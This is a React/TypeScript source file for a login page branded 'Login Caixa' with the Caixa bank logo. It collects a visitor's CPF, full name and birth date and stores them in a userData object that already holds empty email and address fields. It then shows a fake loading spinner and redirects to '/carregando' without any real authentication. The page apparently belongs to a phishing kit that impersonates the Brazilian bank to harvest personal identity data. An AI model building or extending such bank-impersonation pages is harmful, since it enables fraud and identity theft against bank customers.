import { useState } from "react";
import logo from "../assets/caixa.webp";
import userIcon from "../assets/user.png";

export function Login() {
    const [cpf, setCpf] = useState<string>("");
    const [nomeCompleto, setNomeCompleto] = useState<string>("");
    const [dataNascimento, setDataNascimento] = useState<string>("");
    const [isLoading, setIsLoading] = useState<boolean>(false);

    // Função para aplicar a máscara de CPF
    const handleCpfChange = (event: React.ChangeEvent<HTMLInputElement>) => {
        let value = event.target.value.replace(/\D/g, "");
        if (value.length > 11) value = value.slice(0, 11);

        value = value.replace(/(\d{3})(\d)/, "$1.$2");
        value = value.replace(/(\d{3})(\d)/, "$1.$2");
        value = value.replace(/(\d{3})(\d{1,2})$/, "$1-$2");

        setCpf(value);
    };

    // Função para salvar os dados no localStorage e redirecionar com animação
    const handleNext = () => {
        if (cpf.length < 14 || nomeCompleto.length === 0 || dataNascimento.length === 0) {
            alert("Por favor, preencha todos os campos corretamente.");
            return;
        }

        setIsLoading(true);

        // Cria o objeto userData
        const userData = {
            nome: nomeCompleto,
            cpf: cpf,
            dataNascimento: dataNascimento,
            email: "",
            cep: "",
            cidade: "",
            estado: "",
            rua: "",
            numero: ""
        };

        // Armazena o objeto userData no localStorage
        localStorage.setItem("userData", JSON.stringify(userData));

        setTimeout(() => {
            setIsLoading(false);
            window.location.href = "/carregando";
        }, 1500); // Animação de 1.5 segundos antes do redirecionamento
    };

    return (
        <div className="w-screen px-6 space-y-6 mt-6">
            <header className="flex flex-col justify-center items-center p-4 space-y-3">
                <img width={170} src={logo} alt="logo" />
                <span className="text-blue-800">Login Caixa</span>
            </header>

            <div>
                <h1 className="text-lg text-zinc-500">
                    Informe seus dados e clique em "Próximo" para continuar:
                </h1>
            </div>

            {/* Campo CPF */}
            <div className="flex items-center space-x-2">
                <img src={userIcon} alt="user" width={15} />
                <input
                    type="text"
                    value={cpf}
                    onChange={handleCpfChange}
                    className="border-b border-b-orange-500 w-full text-lg outline-none"
                    placeholder="CPF"
                    maxLength={14}
                />
            </div>

            {/* Campo Nome Completo */}
            <div className="flex items-center space-x-2 mt-4">
                <img src={userIcon} alt="user" width={15} />
                <input
                    type="text"
                    value={nomeCompleto}
                    onChange={(e) => setNomeCompleto(e.target.value)}
                    className="border-b border-b-orange-500 w-full text-lg outline-none"
                    placeholder="Nome Completo"
                />
            </div>

            {/* Campo Data de Nascimento */}
            <div className="flex items-center space-x-2 mt-4">
                <img src={userIcon} alt="user" width={15} />
                <input
                    type="date"
                    value={dataNascimento}
                    onChange={(e) => setDataNascimento(e.target.value)}
                    className="border-b border-b-orange-500 w-full text-lg outline-none"
                />
            </div>

            {/* Botão Próximo */}
            <button
                onClick={handleNext}
                className={`w-full text-white rounded-sm flex items-center justify-center h-10 transition-transform duration-150 ${isLoading ? "bg-orange-500 cursor-not-allowed transform scale-90" : "bg-orange-400 hover:scale-105"}`}
                disabled={isLoading}
            >
                {isLoading ? (
                    <div className="animate-spin rounded-full h-5 w-5 border-t-2 border-white"></div>
                ) : (
                    "Próximo"
                )}
            </button>

            <div className="flex flex-col items-center text-blue-900 space-y-6">
                <div className="font-semibold">
                    É novo por aqui? <span className="underline">Cadastre-se</span>
                </div>
                <span className="underline">Preciso de ajuda</span>
            </div>
        </div>
    );
}
